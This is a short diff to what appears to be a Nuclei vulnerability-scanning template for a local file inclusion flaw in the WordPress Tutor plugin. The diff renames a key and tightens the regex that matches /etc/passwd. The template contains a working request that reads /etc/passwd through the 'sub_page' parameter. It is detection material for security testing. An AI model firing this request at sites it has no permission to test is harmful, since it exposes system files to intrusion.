@@ -7,7 +7,7 @@ info:
   reference: https://www.exploit-db.com/exploits/48058
   tags: wordpress,wp-plugin,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd"
@@ -15,5 +15,5 @@ http:
     matchers:
       - type: regex
         regex:
-          - "root:.*:0:0:"
+          - "root:[x*]:0:0:"
         part: body
